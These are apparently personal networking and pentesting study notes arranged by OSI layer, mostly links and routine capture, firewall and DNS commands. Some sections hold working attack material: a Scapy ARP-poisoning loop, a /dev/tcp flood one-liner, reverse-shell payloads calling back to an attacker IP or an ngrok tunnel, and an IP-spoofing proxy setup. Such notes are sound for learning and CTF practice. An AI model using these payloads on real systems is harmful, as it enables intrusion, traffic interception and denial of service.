## Documentation

- https://www.gsma.com/
- https://datatracker.ietf.org/ # RFC for every protocols
- https://en.wikipedia.org/wiki/OSI_model
- https://en.wikipedia.org/wiki/RIPE
- https://github.com/biero-el-corridor/OT_ICS_ressource_list # Industrial Protocols
- https://everything.curl.dev/protocols/curl.html
- https://scapy.readthedocs.io/en/latest/usage.html#classical-attacks
- https://heystacks.com/doc/401/attacking-secondary-contexts-in-web-applications
- https://cyber.gouv.fr/publications/recommandations-relatives-aux-architectures-des-services-dns
- https://cyber.gouv.fr/publications/recommandations-relatives-linterconnexion-dun-si-internet

### Cheatsheet

- https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
- https://github.com/frostbits-security/MITM-cheatsheet/
- https://github.com/antlarac/Wi-Fi-Pentesting-Cheatsheet/

### Forum

- https://lafibre.info/
- https://servethehome.com/
- https://wiki.mesh-idf.fr/fr/home


### Courses & Tutos

- https://www.frameip.com/
- https://beej.us/guide/bgnet0/html/split/
- https://www.it-connect.fr/cours-it-gratuits/
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/
- https://openclassrooms.com/fr/courses/2340511-maitrisez-vos-applications-et-reseaux-tcp-ip

## Captures / Challenges

- https://wifichallengelab.com/
- https://wiki.wireshark.org/SampleCaptures
- https://www.wireshark.org/docs/man-pages/tshark.html
- https://tshark.dev/analyze/packet_hunting/packet_hunting/ (memo)
- https://packetlife.net/blog/2009/jul/13/quick-packet-capture-data-extraction/
- https://pwn.college/intro-to-cybersecurity/intercepting-communication/

```bash
# listening
sudo tcpdump -n -i any udp port 5555
ss -tunlpa

# basic traffic capture
sudo tcpdump -l -n -i wlan0

# basic pcap parsing
# filtering protocols -Y "ip.addr == 127.0.0.1 && icmp.type==8"
tshark -2 -r chall.pcap -T fields -e data
tshark -2 -r chall.pcap -Y "icmp.type==8" -t ad
```

## Tools

- [Alfa antennas - dongle USB](https://www.alfa.com.tw/)
- [Bettercap](https://www.bettercap.org/installation/)
- [Curl - devhints.io](https://devhints.io/curl)
- [Eaphammer](https://github.com/s0lst1c3/eaphammer)
- [GNURadio](https://wiki.gnuradio.org/index.php/Main_Page)
- [GQRX](https://github.com/gqrx-sdr/gqrx)
- [Hex Packet Decoder](https://www.gasmi.net/hpd/)
- [Hping3](https://thelinuxcode.com/hping3/)
- [Impacket](https://github.com/fortra/impacket)
- [Impacket Usage: Active directory protocols](../windows/active_directory)
- [Ngrok](https://ngrok.com/)
- [Revshells](https://revshells.com)
- [Scapy](https://scapy.readthedocs.io/)
- [Tshark](https://tshark.dev/)
- [Wifite2](https://github.com/kimocoder/wifite2)

### BGP (Monitoring RIPE)

- https://sentinelle-routage.fr/

## Network Topology

- https://en.wikipedia.org/wiki/Network_topology

## Physical (L1)

- [NFC, BLE (RF); 802.11x (Wifi) - ./wireless](./wireless)
- https://en.wikipedia.org/wiki/Ethernet
- https://en.wikipedia.org/wiki/InfiniBand

## Data (L2)

### Ethernet

- https://scapy.readthedocs.io/en/latest/routing.html#get-the-mac-of-an-interface
- https://scapy.readthedocs.io/en/latest/usage.html#sending-packets

```python
from scapy.all import *

src_mac = get_if_hwaddr(conf.iface) # ip -br link
dst_mac = "aa:bb:cc:dd:ee:ff" # ping <ip> && arp -a

pkt = Ether(src=src_mac,dst=dst_mac)

pkt.show()
sendp(pkt,conf.iface) #Layer2
```


### ARP

- https://en.wikipedia.org/wiki/Address_Resolution_Protocol
- https://scapy.readthedocs.io/en/latest/usage.html#arp-mitm
- https://web.archive.org/web/20120720120549/http://www.ghostsinthestack.org/article-20-man-in-the-middle.html

```bash
arp-scan wlan0
```

```py
from scapy.all import *
import time

iface = conf.iface
your_mac = get_if_hwaddr(iface)

pkt = Ether(dst=getmacbyip(server_ip))/ARP(
    op=2,
    psrc=client_ip,
    pdst=server_ip,
    hwsrc=your_mac,
    hwdst=getmacbyip(server_ip)
)

pkt2 = Ether(dst=getmacbyip(client_ip))/ARP(
    op=2,
    psrc=server_ip,
    pdst=client_ip,
    hwsrc=your_mac,
    hwdst=getmacbyip(client_ip)
)

while(True):
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(0.5)
    sendp(pkt2, iface=iface, verbose=False)
    time.sleep(0.5)
```

[sniff.py](./sniff.py)

#### Vlan Hopping

- https://blog.bwlryq.net/fr/posts/vlan_hopping/
- https://scapy.readthedocs.io/en/latest/usage.html#arp-cache-poisoning


## Network (L3)

### ICMP

- https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol

### IP

- https://en.wikipedia.org/wiki/Internet_protocol_suite
- https://en.wikipedia.org/wiki/Internet_Protocol
- https://en.wikipedia.org/wiki/Private_network
- https://en.wikipedia.org/wiki/IP_routing
- https://en.wikipedia.org/wiki/Time_to_live
- https://scapy.readthedocs.io/en/latest/usage.html#sending-packets
- https://access.redhat.com/sites/default/files/attachments/rh_ip_command_cheatsheet_1214_jcs_print.pdf

```bash
# bind locally
ip addr add 10.0.0.4/24 dev eth0
```

#### Nat

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/reprenons-du-service/nat/

#### Subnetting

`Memo: masque=subnet+host`

- https://jodies.de/ipcalc
- https://www.calculator.net/ip-subnet-calculator.html
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/veuillez-vous-identifier-pour-communiquer/le-subnetting-en-pratique/

```
10.1.1.0/24 ->3  subnets, 40 hosts 1st one 
- `/24`-> 24 x '1' : 255.255.255.0
- nosferat2: 40 <=64 = 2  ^ 6:  -> increment = (nosferatu (1) 1 (0 0 0 0 0 0) -> 64)) 
- m = ssssss hh : 255.255.255.192 (nosfera2 : 1+1 -> 128+64)= /26 (CIDR notation)
- 10.1.1.0-> 10.1.1.63 (inc=64) -> 2^6 - 2 machines
```

```
1st: 10.1.1.0/26
2nd: 10.1.1.64/26
3d: 10.1.1.128/26
```

#### VPN

- https://en.wikipedia.org/wiki/IPsec
- https://wiki.archlinux.org/title/VPN_over_SSH
- https://github.com/angristan/wireguard-install
- https://github.com/angristan/openvpn-install

## Transport (L4)

### TCP

- https://en.wikipedia.org/wiki/Transmission_Control_Protocol
- https://www.geeksforgeeks.org/computer-networks/tcp-ip-model/
- https://0x25.github.io/2021/09/09/Patch-TCP-packets-on-the-fly/
- https://undercodetesting.com/manually-performing-the-tcp-three-way-handshake-with-scapy/
- https://web.archive.org/web/20120720121725/http://www.ghostsinthestack.org/article-10-lidle-host-scan.html

#### Sockets

- https://realpython.com/python-sockets/
- https://en.wikipedia.org/wiki/Network_socket
- https://maxnilz.com/docs/004-network/001-tcp-connection-est/
- https://scapy.readthedocs.io/en/latest/usage.html#stacking-layers

```py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
```

```py
from scapy.all import *

pkt = IP(dst="10.0.0.4")/TCP(dport=65535)
pkt.show2()   # better than show(): computes lengths/checksums
send(pkt)
```

#### Denial of Service

- [Hping3](https://thelinuxcode.com/hping3/)
- https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/

`while true; do   exec 3<>/dev/tcp/ip/port;   exec 3<&-; done`

#### Firewall 

[../ctf](../ctf)

- https://linuxize.com/cheatsheet/iptables/
- https://github.com/trimstray/iptables-essentials
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/apprenons-a-securiser-un-reseau/allumez-le-pare-feu/
- https://docs.suricata.io/en/suricata-6.0.0/rules/intro.html

```bash
# Check rules
iptables -L -n --line-numbers

# Allow SSH from 5.6.7.8
iptables -A INPUT -p tcp --dport 22 -s 5.6.7.8 -j ACCEPT

# Block SSH from 1.2.3.4
iptables -A INPUT -p tcp --dport 22 -s 1.2.3.4 -j DROP
```

#### Port Knocking

- https://en.wikipedia.org/wiki/Port_knocking
- https://github.com/jvinet/knock
- https://goteleport.com/blog/ssh-port-knocking/

```bash
# port knocking for default ssh port , for any new packet:
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# accept only if packets go in GATE1 then GATE2
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 7000 -m recent --set --name GATE1 -j DROP
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8000 -m recent --rcheck --seconds 10 --name GATE1 -m recent --set --name GATE2 -j DROP
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -m recent --rcheck --seconds 30 --name GATE2 -j ACCEPT

# if any packet does not satisfy those conditions
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j DROP
```

```bash
for port in 7000, 8000, 22; do nc -w 1 -v server $port; sleep 1; done
```

#### Reverse shell

- https://www.revshells.com/
- https://github.com/0xfalafel/rcat
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
# Most generic payload on victim's side
busybox nc <ip> <port> -e sh
```

*Private network*

`Using tun0 interface (ex OpenVPN)`

```bash
# Attacker
rlwrap nc -nlpv 4444
```

```bash
# Victim
sh -i >& /dev/tcp/<ip tun0>/4444 0>&1
```

*Public network*

- https://web.archive.org/web/20250424195428/ttps://cheatsheet.haax.fr/shells-methods/reverse/

```bash
#term1
ngrok config add-authtoken TOKEN
ngrok tcp 4444

#Forwarding                    tcp://5.tcp.eu.ngrok.io:16833 -> localhost:4444


#term2
rlwrap nc -nlvp 4444
```

```bash
# Victim
sh -i >& /dev/tcp/5.tcp.eu.ngrok.io/16833 0>&1
```

### Reverse Proxy - Ip Spoofing

```bash
ngrok tcp 4444
rlwrap nc -nlvp 4444
```

**Nginx**

```bash
sudo apt install nginx
```

```bash
sudo vim etc/nginx/sites-available/default
```

```
server {
   ...
         # remplacer location /
	location / {
                proxy_pass http://vulnerable-site.org ; 
                proxy_set_header X-Forwarded-For $remote_addr ;
	}
   ...
}
```

```bash
sudo systemctl restart nginx
firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulnerable-site.org/page
```


## Session (L5)

### Named pipes

- https://en.wikipedia.org/wiki/Named_pipe
- https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html
- https://learn.microsoft.com/en-us/windows/win32/ipc/interprocess-communications

### SOCKS 

- https://en.wikipedia.org/wiki/SOCKS
- http://michalszalkowski.com/security/pivoting-tunneling-port-forwarding/chisel-socks5-tunneling-windows-rev/

## Presentation (L6)

### ASN1

- https://en.wikipedia.org/wiki/ASN.1
- [ASN.1 PEM/DER Decoder](https://lapo.it/asn1js/)

### MIME

- https://en.wikipedia.org/wiki/MIME

### SSL

- https://crt.sh
- https://www.ssllabs.com/ssltest/
- https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work
- https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/ # HeartBleed CVE explanation


## Application (L7)

### DNS

- https://en.wikipedia.org/wiki/Domain_Name_System
- [Bind9 DNS cache poisoning - predictable UDP port](https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)
- https://blog.cloudflare.com/everything-you-ever-wanted-to-know-about-udp-sockets-but-were-afraid-to-ask-part-1/

#### Free DNS

- https://www.noip.com/

#### Zone transfer

Get AXFR records without auth:

- get subdomains from domain_name
- all records for a subdomain

```bash
dig axfr @IP (sub)_domain_name
#@server/routeur subdomain

host -t axfr zonetransfer.me nsztm1.digi.ninja.
```

#### DNSCrypt & DNSSEC

- https://github.com/DNSCrypt/dnscrypt-proxy/wiki/Installation-linux
- https://security.stackexchange.com/questions/122547/is-there-a-point-to-dnscrypt-when-using-vpn
- https://github.com/DNSCrypt/dnscrypt-proxy/issues/519

**1.1.1.1**

- https://security.stackexchange.com/questions/238871/will-1-1-1-1-hide-my-traffic-from-my-landlords-router
- https://www.reddit.com/r/CloudFlare/comments/15inies/difference_between_1111_and_warp/

ou

```bash
sudo pacman -S dnsproxy
sudo rm -f /etc/resolv.c*
sudo nano /etc/resolv.conf
#nameserver 127.0.0.1
#options edns0

sudo dnscrypt-proxy -service install
sudo dnscrypt-proxy -service start
dnscrypt-proxy -config /etc/dnscrypt-proxy/dnscrypt-proxy.toml -resolve example.com
```

- https://lig-membres.imag.fr/sicard/tpRES/DNSRICM2-TP.pdf
- https://digi.ninja/projects/zonetransferme.php

#### DNS Rebinding

- https://nip.io/ 
- https://github.com/mpgn/ByP-SOP
- https://lock.cmpxchg8b.com/rebinder.html

#### Reverse DNS lookup

- https://web-check.as93.net/
- https://dnsdumpster.com/ (map)
- https://search.censys.io/
- https://www.ssllabs.com/ssltest/
- https://subdomainfinder.c99.nl/
- https://www.duckdns.org/

```bash
whois google.com
```

```bash
nslookup flaws.cloud
nslookup 52.92.249.179
```

### HTTP(s)

- [ssl](https://github.com/4nuit/Hacking/tree/master/crypto#ssl)
- [Curl Options & POST - Gist](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58)
- https://en.wikipedia.org/wiki/HTTPS
- https://en.wikipedia.org/wiki/Transport_Layer_Security
- https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol

```bash
mkdir secret; cd secret
ngrok tcp 4444

python -m http.server 4444
```

### FTP

- https://fr.wikipedia.org/wiki/File_Transfer_Protocol

Serveur:

```bash
mkdir secret; cd secret
python -m pyftpdlib -D
ngrok tcp 2121
```

### LDAP

- https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html

#### Tools

- https://github.com/franc-pentest/ldeep
- https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html
- https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command


### POP/IMAP

- https://support.mozilla.org/en-US/kb/blocking-sender
- https://elsicarius.fr/les-adresses-email-vous-connaissez

### QUIC

- https://github.com/francoismichel/ssh3

### SNMP

- https://www.0x0ff.info/2013/snmpv3-des-cryptool/

### XMPP

- https://wiki.xmpp.org/web/SASL_Authentication_and_SCRAM

### VoIP

- https://www.eventhelix.com/ims/
- https://www.eventhelix.com/telecom/
- https://en.wikipedia.org/wiki/IP_PBX

#### SIP

- https://en.wikipedia.org/wiki/Session_Initiation_Protocol # ~HTTP for phones
- https://github.com/miconda/sip-resources                  # tools (linphone, sipvicious)
- https://sourceforge.net/projects/openbts/
- https://www.commentcamarche.net/telecharger/communication/24399-x-lite/

![sip](./images/maps-sip-web-architecture.jpg)
